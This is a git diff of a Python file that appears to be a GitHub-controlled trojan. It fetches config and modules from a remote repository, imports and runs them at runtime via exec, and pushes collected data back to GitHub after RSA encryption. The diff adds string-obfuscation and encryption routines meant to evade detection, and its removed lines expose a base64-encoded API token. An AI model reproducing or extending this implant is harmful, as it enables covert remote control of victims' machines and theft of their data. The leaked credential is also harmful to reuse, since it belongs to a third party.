@@ -17,21 +17,23 @@ from github3 import login
 #class to hold configuration settings
 class Config:
 	def __init__(self):
+		#strings should be obfuscated
 		self.mod = "modules/" #path to modules directory
-		self.config = "config/" #path to config files directory
+		self.config = "config/"#path to config files directory
 		self.data = "data/" #path of directory to upload data to
 		self.repo = "wendigo_test" #name of repo
 		self.usr = "daniellohrey" #username of repo owner
 		#token to use git api
-		self.token = "YWUwMGNlNzJjYWU3NTI5NzMwOGIyMmIwNjQzNmM5MjQyNDM4YmY2Ng=="
+		self.token = "INSERT TOKEN"
 		#public key to encrypt data
-		self.pk = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAndOV4VLdGZgIk+YcW7Kl\nVwiBiesJq6upfiRBo2hM5CEzQiSeBa1/A4h5ozSgQtSgKURVmlDChTNrs0P4bwvi\npCvq8B5SdBw4gcc7YTy03Hl11wfbIPCwqA9JwUl6ZzQtEbw7BAfndry44+2QmAoL\nU2uOoyW2C4MjmUG6SDmNfAL/PsMCvL4fiBJh2V2EUWtCPEqkVIGUHERFFaJwFea3\nFdIqIFVV4SzU6c73wdRFWKHie5WZ4GXQ3GaIAe2cyCMp3UavOhpk4s+N5xdG1xXs\n2AvfXuotYRVxvmSz+L0QiyTXNn0gmphLrMph3jyY/+KX4TH0wIxEx1ZK1gYO8D1V\npQIDAQAB\n-----END PUBLIC KEY-----"
-		self.pwd = "zippass" #password on zipped files
-		self.sleep = "5" #time to sleep between checking for config files
+		self.pk = "INSERT PUBLIC KEY"
+		self.pwd = "password" #password on zipped files
+		self.sleep = "10" #time to sleep between checking for config files
 		#seed to generate filenames, also key to module key
-		self.fn_s = "fn_seed_module"
+		self.fn_s = "fn_mod"
 		#seed to generate ids, also used as sleep key
-		self.id_s = "id_seed_sleep"
+		self.id_s = "id_slp"
+		self.imp = "import %s"
 		self.size = "256" #block size of cipher
 		self.size = int(self.fixstr(self.size))
 		self.sleep = int(self.fixstr(self.sleep))
@@ -39,15 +41,14 @@ class Config:
 		self.u_id() #generate a new id on start
 		self.u_pk(self.pk) #import public key into cipher object
 
-	#generates a new id by hashing time and seed (only half of id process)
+	#generates a new id by hashing time and seed
 	def u_id(self):
 		i_time = int(time.time())
 		t_id = str(i_time) + self.fixstr(self.id_s)
 		self.id = str(xxhash.xxh64(t_id).hexdigest())
 		self.id = self.obfstr(self.id)
 
-	#returns our current id by hashing what we already generated
-	#just use fixstr instead of hashing
+	#returns deobfuscated id
 	def g_id(self):
 		return self.fixstr(self.id)
 
@@ -71,7 +72,7 @@ class Config:
 
 	#returns deobfuscated data path to new data file
 	def g_data(self):
-		return self.fixstr(self.data) + self.id() + "/" + self.nfn()
+		return self.fixstr(self.data) + self.id() + "/" + self.g_fn()
 
 	#sets new obfuscated data path
 	def u_data(self, new):
@@ -107,6 +108,7 @@ class Config:
 
 	#creates new crypto object from new public key
 	def u_pk(self, new):
+		new = base64.b64decode(self.fixstr(new))
 		self.pk = new
 		self.pk = RSA.importKey(self.pk)
 		self.pk = PKCS1_OAEP.new(self.pk)
@@ -132,13 +134,53 @@ class Config:
 		com = str(time.time())
 		return xxhash.xxh64(com).hexdigest()
 
+	#returns string to call import at runtime
+	def g_imp(self):
+		return self.fixstr(self.imp)
+
+	#returns string used as seed and index
+	def g_fn_s(self):
+		return self.fixstr(self.fn_s)
+
+	#returns string used as seed and index
+	def g_id_s(self):
+		return self.fixstr(self.id_s)
+
+	#updates seed/index string
+	def u_id_s(self, new):
+		self.id_s = self.obfstr(new)
+		return
+
+	#updates seed/index string
+	def u_fn_id(self, new):
+		self.fn_s = self.obfstr(new)
+		return
+
 	#deobfuscates strings
 	def fixstr(self, o_str):
-		return o_str
+		return o_str #dont obfuscate while testing
+		i = 0
+		n_str = ""
+		for c in o_str:
+			if i % 2 == 1:
+				n_str += c
+			i += 1
+		return n_str
 
 	#obfuscates strings
 	def obfstr(self, f_str):
-		return f_str
+		return f_str #dont obfuscate while testing
+		i_time = int(time.time())
+		t_id = str(i_time) + self.fixstr(self.id_s)
+		h = str(xxhash.xxh64(t_id).hexdigest())
+		i = 0
+		o_str = ""
+		for c in f_str:
+			o_str += h[i % len(h)]
+			o_str += c
+			i += 1
+		o_str += h[i % len(h)]
+		return o_str
 
 #class to update pythons import functionality to grab modules from github
 class ReImp(object):
@@ -185,7 +227,7 @@ def get_config():
 		c_dict = json.loads(c_json)
 		for mod in c_dict:
 			if mod[config.fn_s] not in sys.modules:
-				exec("import %s" % mod[config.fn_s])
+				exec(config.g_imp() % mod[config.fn_s])
 		return c_dict
 	except:
 		return None
@@ -202,16 +244,21 @@ def push_data(data):
 	return
 
 #decrypts modules and config files
+#decrypted = zip(base64(data))
 def decrypt(data):
-#	decoded = base64.b64decode(data) #need to use stringio file like objects
-#	compressed = zipfile.ZipFile(decoded, 'r')
-#	decompressed = compressed.read(name, config.my_pwd())
-#	return decompressed
-	return data
+	return data #dont encrypt while testing
+	decoded = base64.b64decode(data)
+	s_io = StringIO.StringIO(decoded) #open
+	zipped = zipfile.ZipFile(s_io, 'r')
+	uzip = zipped.read(config.fn_s, config.g_pwd()) #returns file as bytes
+	zipped.close()
+	s_io.close()
+	return uzip
 
 #encrypts data before pushing it to github
 #encrypted = base64(rsa(zip(data)))
 def encrypt(data):
+	return data #dont encrypt while testing
 	key = config.g_pk()
 	size = config.size
 	offset = 0
@@ -230,7 +277,9 @@ def run_module(**task):
 	try:
 		global config
 		#config is passed to module and returned to update config options
-		config, result = sys.modules[task[config.fn_s]].run(config, **task)
+		conf, result = sys.modules[task[config.fn_s]].run(config, **task)
+		if conf is not None:
+			config = conf
 		while True:
 			#were in a separate thread so we just keep trying to push data
 			try:
